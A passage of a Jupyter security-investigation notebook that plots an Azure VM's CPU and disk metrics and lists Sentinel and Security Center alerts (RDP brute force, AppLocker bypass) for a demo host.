table-cell;\">below&nbsp;=&nbsp;[DatetimeAxis(id='4979', ...)],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">border_fill_alpha&nbsp;=&nbsp;1.0,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">border_fill_color&nbsp;=&nbsp;'#ffffff',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">center&nbsp;=&nbsp;[Grid(id='4982', ...), Grid(id='4986', ...), Legend(id='5027', ...)],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">css_classes&nbsp;=&nbsp;[],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">disabled&nbsp;=&nbsp;False,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">extra_x_ranges&nbsp;=&nbsp;{},</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">extra_y_ranges&nbsp;=&nbsp;{},</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">frame_height&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">frame_width&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height_policy&nbsp;=&nbsp;'auto',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">hidpi&nbsp;=&nbsp;True,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_event_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_property_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">left&nbsp;=&nbsp;[LinearAxis(id='4983', ...)],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">lod_factor&nbsp;=&nbsp;10,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">lod_interval&nbsp;=&nbsp;300,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">lod_threshold&nbsp;=&nbsp;2000,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">lod_timeout&nbsp;=&nbsp;500,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">margin&nbsp;=&nbsp;(0, 0, 0, 0),</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">match_aspect&nbsp;=&nbsp;False,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_height&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_width&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_border&nbsp;=&nbsp;5,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_border_bottom&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_border_left&nbsp;=&nbsp;50,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_border_right&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_border_top&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_height&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_width&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">name&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">outline_line_alpha&nbsp;=&nbsp;1.0,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">outline_line_cap&nbsp;=&nbsp;'butt',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">outline_line_color&nbsp;=&nbsp;'#e5e5e5',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">outline_line_dash&nbsp;=&nbsp;[],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">outline_line_dash_offset&nbsp;=&nbsp;0,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">outline_line_join&nbsp;=&nbsp;'bevel',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">outline_line_width&nbsp;=&nbsp;1,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">output_backend&nbsp;=&nbsp;'canvas',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">plot_height&nbsp;=&nbsp;400,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">plot_width&nbsp;=&nbsp;900,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">renderers&nbsp;=&nbsp;[GlyphRenderer(id='5006', ...), GlyphRenderer(id='5033', ...), GlyphRenderer(id='5061', ...)],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">reset_policy&nbsp;=&nbsp;'standard',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">right&nbsp;=&nbsp;[],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">sizing_mode&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">subscribed_events&nbsp;=&nbsp;[],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">tags&nbsp;=&nbsp;[],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">title&nbsp;=&nbsp;Title(id='4969', ...),</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">title_location&nbsp;=&nbsp;'above',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">toolbar&nbsp;=&nbsp;Toolbar(id='4993', ...),</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">toolbar_location&nbsp;=&nbsp;'above',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">toolbar_sticky&nbsp;=&nbsp;True,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">visible&nbsp;=&nbsp;True,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width_policy&nbsp;=&nbsp;'auto',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">x_range&nbsp;=&nbsp;Range1d(id='4971', ...),</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">x_scale&nbsp;=&nbsp;LinearScale(id='4975', ...),</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">y_range&nbsp;=&nbsp;DataRange1d(id='4973', ...),</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">y_scale&nbsp;=&nbsp;LinearScale(id='4977', ...))</div></div></div>\n",
       "<script>\n",
       "(function() {\n",
       "  var expanded = false;\n",
       "  var ellipsis = document.getElementById(\"5249\");\n",
       "  ellipsis.addEventListener(\"click\", function() {\n",
       "    var rows = document.getElementsByClassName(\"5248\");\n",
       "    for (var i = 0; i < rows.length; i++) {\n",
       "      var el = rows[i];\n",
       "      el.style.display = expanded ? \"none\" : \"table-row\";\n",
       "    }\n",
       "    ellipsis.innerHTML = expanded ? \"&hellip;)\" : \"&lsaquo;&lsaquo;&lsaquo;\";\n",
       "    expanded = !expanded;\n",
       "  });\n",
       "})();\n",
       "</script>\n"
      ],
      "text/plain": [
       "Figure(id='4968', ...)"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "mets = az.get_metrics(metrics=\"Percentage CPU,Disk Read Bytes,Disk Write Bytes\", resource_id=res_id, sub_id=sub_id, sample_time=\"hour\", start_time=15)\n",
    "\n",
    "disk_read_data = mets['Disk Read Bytes']\n",
    "disk_read_data['Type'] = 'Disk Read'\n",
    "disk_write_data = mets['Disk Write Bytes']\n",
    "disk_write_data['Type'] = \"Disk Write\"\n",
    "disk_data = pd.concat([disk_read_data, disk_write_data])\n",
    "\n",
    "nbdisplay.display_timeline_values(\n",
    "        data=mets['Percentage CPU'],\n",
    "        title=\"Host CPU Usage\",\n",
    "        time_column = 'Time',\n",
    "        y='Data',\n",
    "        height=400,\n",
    "        source_columns=['Time', 'Data'],\n",
    "        kind='line',\n",
    "        range_tool=False\n",
    "    )\n",
    "\n",
    "nbdisplay.display_timeline_values(\n",
    "        data=metrics,\n",
    "        title=\"Host Disk Usage\",\n",
    "        time_column = 'Time',\n",
    "        y='Data',\n",
    "        height=400,\n",
    "        source_columns=['Time', 'Data'],\n",
    "        kind='line',\n",
    "        group_by='Type',\n",
    "        range_tool=False\n",
    "    )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Host Alerts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>AlertDisplayName</th>\n",
       "      <th>AlertName</th>\n",
       "      <th>Severity</th>\n",
       "      <th>Description</th>\n",
       "      <th>ProviderName</th>\n",
       "      <th>VendorName</th>\n",
       "      <th>VendorOriginalId</th>\n",
       "      <th>SystemAlertId</th>\n",
       "      <th>ResourceId</th>\n",
       "      <th>SourceComputerId</th>\n",
       "      <th>AlertType</th>\n",
       "      <th>ConfidenceLevel</th>\n",
       "      <th>ConfidenceScore</th>\n",
       "      <th>IsIncident</th>\n",
       "      <th>StartTimeUtc</th>\n",
       "      <th>EndTimeUtc</th>\n",
       "      <th>ProcessingEndTime</th>\n",
       "      <th>RemediationSteps</th>\n",
       "      <th>ExtendedProperties</th>\n",
       "      <th>Entities</th>\n",
       "      <th>SourceSystem</th>\n",
       "      <th>WorkspaceSubscriptionId</th>\n",
       "      <th>WorkspaceResourceGroup</th>\n",
       "      <th>ExtendedLinks</th>\n",
       "      <th>ProductName</th>\n",
       "      <th>ProductComponentName</th>\n",
       "      <th>AlertLink</th>\n",
       "      <th>Type</th>\n",
       "      <th>Computer</th>\n",
       "      <th>src_hostname</th>\n",
       "      <th>src_accountname</th>\n",
       "      <th>src_procname</th>\n",
       "      <th>host_match</th>\n",
       "      <th>acct_match</th>\n",
       "      <th>proc_match</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>2020-07-07 23:55:56+00:00</td>\n",
       "      <td>RDP Brute Force</td>\n",
       "      <td>RDP Brute Force</td>\n",
       "      <td>Medium</td>\n",
       "      <td></td>\n",
       "      <td>ASI Scheduled Alerts</td>\n",
       "      <td>Microsoft</td>\n",
       "      <td>fc5c53be-d356-40f1-b5c4-06beb418c4fe</td>\n",
       "      <td>1798368c-5c4b-ceb0-7b41-a4b2253e5879</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0_765132a3-cf2f-40cf-b45c-cd6be9b942b7</td>\n",
       "      <td>Unknown</td>\n",
       "      <td>NaN</td>\n",
       "      <td>False</td>\n",
       "      <td>2020-07-07 23:46:28+00:00</td>\n",
       "      <td>2020-07-07 23:46:39+00:00</td>\n",
       "      <td>2020-07-07 23:55:56+00:00</td>\n",
       "      <td></td>\n",
       "      <td>{\\r\\n  \"Query\": \"let bruteforce_hosts = (\\r\\nSecurityEvent\\r\\n| where Computer contains \\\"blackh...</td>\n",
       "      <td>[\\r\\n  {\\r\\n    \"$id\": \"3\",\\r\\n    \"Address\": \"174.127.235.80\",\\r\\n    \"Type\": \"ip\"\\r\\n  },\\r\\n ...</td>\n",
       "      <td>Detection</td>\n",
       "      <td>40dcc8bf-0478-4f3b-b275-ed0a94f2c013</td>\n",
       "      <td>asihuntomsworkspacerg</td>\n",
       "      <td></td>\n",
       "      <td>Azure Sentinel</td>\n",
       "      <td>Scheduled Alerts</td>\n",
       "      <td></td>\n",
       "      <td>SecurityAlert</td>\n",
       "      <td>BlackHatDemoHos</td>\n",
       "      <td>BlackHatDemoHos</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>True</td>\n",
       "      <td>False</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>2020-07-07 23:37:38+00:00</td>\n",
       "      <td>Potential attempt to bypass AppLocker detected</td>\n",
       "      <td>Potential attempt to bypass AppLocker detected</td>\n",
       "      <td>High</td>\n",
       "      <td>Analysis of host data on BLACKHATDEMOHOS detected a potential attempt to bypass AppLocker restri...</td>\n",
       "      <td>MSTIC</td>\n",
       "      <td>Microsoft</td>\n",
       "      <td>f5a6e93f-7b7b-4fd8-8a3b-1ebd2888a01f</td>\n",
       "      <td>2518081357717985123_f5a6e93f-7b7b-4fd8-8a3b-1ebd2888a01f</td>\n",
       "      <td>/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Micros...</td>\n",
       "      <td>73a015ec-e2b6-4bf7-b353-ebeafb54254e</td>\n",
       "      <td>VM.Windows_ApplockerBypass</td>\n",
       "      <td>Unknown</td>\n",
       "      <td>NaN</td>\n",
       "      <td>False</td>\n",
       "      <td>2020-07-07 23:37:08+00:00</td>\n",
       "      <td>2020-07-07 23:37:08+00:00</td>\n",
       "      <td>2020-07-07 23:37:39+00:00</td>\n",
       "      <td>[\\r\\n  \"Review with BLACKHATDEMOHOS\\\\mstic_admin the suspicious command line in this alert to se...</td>\n",
       "      <td>{\\r\\n  \"Compromised Host\": \"BLACKHATDEMOHOS\",\\r\\n  \"User Name\": \"BLACKHATDEMOHOS\\\\mstic_admin\",\\...</td>\n",
       "      <td>[\\r\\n  {\\r\\n    \"$id\": \"4\",\\r\\n    \"DnsDomain\": \"\",\\r\\n    \"NTDomain\": \"\",\\r\\n    \"HostName\": \"B...</td>\n",
       "      <td>Detection</td>\n",
       "      <td>40dcc8bf-0478-4f3b-b275-ed0a94f2c013</td>\n",
       "      <td>asihuntomsworkspacerg</td>\n",
       "      <td></td>\n",
       "      <td>Azure Security Center</td>\n",
       "      <td></td>\n",
       "      <td>https://portal.azure.com/#blade/Microsoft_Azure_Security/AlertBlade/alertId/2518081357717985123_...</td>\n",
       "      <td>SecurityAlert</td>\n",
       "      <td>BlackHatDemoHos</td>\n",
       "      <td>BlackHatDemoHos</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>True</td>\n",
       "      <td>False</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>2020-07-07 23:37:38+00:00</td>\n",
       "      <td>Potential attempt to bypass AppLocker detected</td>\n",
       "      <td>Potential attempt to bypass AppLocker detected</td>\n",
       "      <td>High</td>\n",
       "      <td>Analysis of host data on BLACKHATDEMOHOS detected a potential attempt to bypass AppLocker restri...</td>\n",
       "      <td>MSTIC</td>\n",
       "      <td>Microsoft</td>\n",
       "      <td>f5a6e93f-7b7b-4fd8-8a3b-1ebd2888a01f</td>\n",
       "      <td>3b6e2398-e213-007c-c1eb-4969b2db9094</td>\n",
       "      <td>/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Micros...</td>\n",
       "      <td>73a015ec-e2b6-4bf7-b353-ebeafb54254e</td>\n",
       "      <td>VM.Windows_ApplockerBypass</td>\n",
       "      <td>Unknown</td>\n",
       "      <td>NaN</td>\n",
       "      <td>False</td>\n",
       "      <td>2020-07-07 23:37:08+00:00</td>\n",
       "      <td>2020-07-07 23:37:08+00:00</td>\n",
       "      <td>2020-07-07 23:37:39+00:00</td>\n",
       "      <td>[\\r\\n  \"Review with BLACKHATDEMOHOS\\\\mstic_admin the suspicious command line in this alert to se...</td>\n",
       "      <td>{\\r\\n  \"Compromised Host\": \"BLACKHATDEMOHOS\",\\r\\n  \"User Name\": \"BLACKHATDEMOHOS\\\\mstic_admin\",\\...</td>\n",
       "      <td>[\\r\\n  {\\r\\n    \"$id\": \"4\",\\r\\n    \"DnsDomain\": \"\",\\r\\n    \"NTDomain\": \"\",\\r\\n    \"HostName\": \"B...</td>\n",
       "      <td>Detection</td>\n",
       "      <td>40dcc8bf-0478-4f3b-b275-ed0a94f2c013</td>\n",
       "      <td>asihuntomsworkspacerg</td>\n",
       "      <td></td>\n",
       "      <td>Azure Security Center</td>\n",
       "      <td></td>\n",
       "      <td>https://portal.azure.com/#blade/Microsoft_Azure_Security/AlertBlade/alertId/2518081357717985123_...</td>\n",
       "      <td>SecurityAlert</td>\n",
       "      <td>BlackHatDemoHos</td>\n",
       "      <td>BlackHatDemoHos</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>True</td>\n",
       "      <td>False</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                               TenantId             TimeGenerated  \\\n",
       "0  52b1ab41-869e-4138-9e40-2a4457f09bf0 2020-07-07 23:55:56+00:00   \n",
       "1  52b1ab41-869e-4138-9e40-2a4457f09bf0 2020-07-07 23:37:38+00:00   \n",
       "2  52b1ab41-869e-4138-9e40-2a4457f09bf0 2020-07-07 23:37:38+00:00   \n",
       "\n",
       "                                 AlertDisplayName  \\\n",
       "0                                 RDP Brute Force   \n",
       "1  Potential attempt to bypass AppLocker detected   \n",
       "2  Potential attempt to bypass AppLocker detected   \n",
       "\n",
       "                                        AlertName Severity  \\\n",
       "0                                 RDP Brute Force   Medium   \n",
       "1  Potential attempt to bypass AppLocker detected     High   \n",
       "2  Potential attempt to bypass AppLocker detected     High   \n",
       "\n",
       "                                                                                           Description  \\\n",
       "0                                                                                                        \n",
       "1  Analysis of host data on BLACKHATDEMOHOS detected a potential attempt to bypass AppLocker restri...   \n",
       "2  Analysis of host data on BLACKHATDEMOHOS detected a potential attempt to bypass AppLocker restri...   \n",
       "\n",
       "           ProviderName VendorName                      VendorOriginalId  \\\n",
       "0  ASI Scheduled Alerts  Microsoft  fc5c53be-d356-40f1-b5c4-06beb418c4fe   \n",
       "1                 MSTIC  Microsoft  f5a6e93f-7b7b-4fd8-8a3b-1ebd2888a01f   \n",
       "2                 MSTIC  Microsoft  f5a6e93f-7b7b-4fd8-8a3b-1ebd2888a01f   \n",
       "\n",
       "                                              SystemAlertId  \\\n",
       "0                      1798368c-5c4b-ceb0-7b41-a4b2253e5879   \n",
       "1  2518081357717985123_f5a6e93f-7b7b-4fd8-8a3b-1ebd2888a01f   \n",
       "2                      3b6e2398-e213-007c-c1eb-4969b2db9094   \n",
       "\n",
       "                                                                                            ResourceId  \\\n",
       "0                                                                                                        \n",
       "1  /subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Micros...   \n",
       "2  /subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Micros...   \n",
       "\n",
       "                       SourceComputerId  \\\n",
       "0                                         \n",
       "1  73a015ec-e2b6-4bf7-b353-ebeafb54254e   \n",
       "2  73a015ec-e2b6-4bf7-b353-ebeafb54254e   \n",
       "\n",
       "                                                                   AlertType  \\\n",
       "0  52b1ab41-869e-4138-9e40-2a4457f09bf0_765132a3-cf2f-40cf-b45c-cd6be9b942b7   \n",
       "1                                                 VM.Windows_ApplockerBypass   \n",
       "2                                                 VM.Windows_ApplockerBypass   \n",
       "\n",
       "  ConfidenceLevel  ConfidenceScore  IsIncident              StartTimeUtc  \\\n",
       "0         Unknown              NaN       False 2020-07-07 23:46:28+00:00   \n",
       "1         Unknown              NaN       False 2020-07-07 23:37:08+00:00   \n",
       "2         Unknown              NaN       False 2020-07-07 23:37:08+00:00   \n",
       "\n",
       "                 EndTimeUtc         ProcessingEndTime  \\\n",
       "0 2020-07-07 23:46:39+00:00 2020-07-07 23:55:56+00:00   \n",
       "1 2020-07-07 23:37:08+00:00 2020-07-07 23:37:39+00:00   \n",
       "2 2020-07-07 23:37:08+00:00 2020-07-07 23:37:39+00:00   \n",
       "\n",
       "                                                                                      RemediationSteps  \\\n",
       "0                                                                                                        \n",
       "1  [\\r\\n  \"Review with BLACKHATDEMOHOS\\\\mstic_admin the suspicious command line in this alert to se...   \n",
       "2  [\\r\\n  \"Review with BLACKHATDEMOHOS\\\\mstic_admin the suspicious command line in this alert to se...   \n",
       "\n",
       "                                                                                    ExtendedProperties  \\\n",
       "0  {\\r\\n  \"Query\": \"let bruteforce_hosts = (\\r\\nSecurityEvent\\r\\n| where Computer contains \\\"blackh...   \n",
       "1  {\\r\\n  \"Compromised Host\": \"BLACKHATDEMOHOS\",\\r\\n  \"User Name\": \"BLACKHATDEMOHOS\\\\mstic_admin\",\\...   \n",
       "2  {\\r\\n  \"Compromised Host\": \"BLACKHATDEMOHOS\",\\r\\n  \"User Name\": \"BLACKHATDEMOHOS\\\\mstic_admin\",\\...   \n",
       "\n",
       "                                                                                              Entities  \\\n",
       "0  [\\r\\n  {\\r\\n    \"$id\": \"3\",\\r\\n    \"Address\": \"174.127.235.80\",\\r\\n    \"Type\": \"ip\"\\r\\n  },\\r\\n ...   \n",
       "1  [\\r\\n  {\\r\\n    \"$id\": \"4\",\\r\\n    \"DnsDomain\": \"\",\\r\\n    \"NTDomain\": \"\",\\r\\n    \"HostName\": \"B...   \n",
       "2  [\\r\\n  {\\r\\n    \"$id\": \"4\",\\r\\n    \"DnsDomain\": \"\",\\r\\n    \"NTDomain\": \"\",\\r\\n    \"HostName\": \"B...   \n",
       "\n",
       "  SourceSystem               WorkspaceSubscriptionId WorkspaceResourceGroup  \\\n",
       "0    Detection  40dcc8bf-0478-4f3b-b275-ed0a94f2c013  asihuntomsworkspacerg   \n",
       "1    Detection  40dcc8bf-0478-4f3b-b275-ed0a94f2c013  asihuntomsworkspacerg   \n",
       "2    Detection  40dcc8bf-0478-4f3b-b275-ed0a94f2c013  asihuntomsworkspacerg   \n",
       "\n",
       "  ExtendedLinks            ProductName ProductComponentName  \\\n",
       "0                       Azure Sentinel     Scheduled Alerts   \n",
       "1                Azure Security Center                        \n",
       "2                Azure Security Center                        \n",
       "\n",
       "                                                                                             AlertLink  \\\n",
       "0                                                                                                        \n",
       "1  https://portal.azure.com/#blade/Microsoft_Azure_Security/AlertBlade/alertId/2518081357717985123_...   \n",
       "2  https://portal.azure.com/#blade/Microsoft_Azure_Security/AlertBlade/alertId/2518081357717985123_...   \n",
       "\n",
       "            Type         Computer     src_hostname src_accountname  \\\n",
       "0  SecurityAlert  BlackHatDemoHos  BlackHatDemoHos                   \n",
       "1  SecurityAlert  BlackHatDemoHos  BlackHatDemoHos                   \n",
       "2  SecurityAlert  BlackHatDemoHos  BlackHatDemoHos                   \n",
       "\n",
       "  src_procname  host_match  acct_match  proc_match  \n",
       "0                     True       False       False  \n",
       "1                     True       False       False  \n",
       "2                     True       False       False  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e016554527564069a19b9c8e44e3444a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(Text(value='', description='Filter alerts by title:', style=DescriptionStyle(description_width=…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<hr>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "            <h3>Alert: 'RDP Brute Force'</h3>\n",
       "            <b>Alert_time:</b> 2020-07-07 23:46:28+00:00,\n",
       "            <b>Compr_entity:</b> BlackHatDemoHos,\n",
       "            <b>Alert_id:</b> 1798368c-5c4b-ceb0-7b41-a4b2253e5879\n",
       "            <table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>0</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>TenantId</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>TimeGenerated</th>\n",
       "      <td>2020-07-07 23:55:56+00:00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>AlertDisplayName</th>\n",
       "      <td>RDP Brute Force</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>AlertName</th>\n",
       "      <td>RDP Brute Force</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Severity</th>\n",
       "      <td>Medium</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Description</th>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ProviderName</th>\n",
       "      <td>ASI Scheduled Alerts</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>VendorName</th>\n",
       "      <td>Microsoft</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>VendorOriginalId</th>\n",
       "      <td>fc5c53be-d356-40f1-b5c4-06beb418c4fe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>SystemAlertId</th>\n",
       "      <td>1798368c-5c4b-ceb0-7b41-a4b2253e5879</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ResourceId</th>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>SourceComputerId</th>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
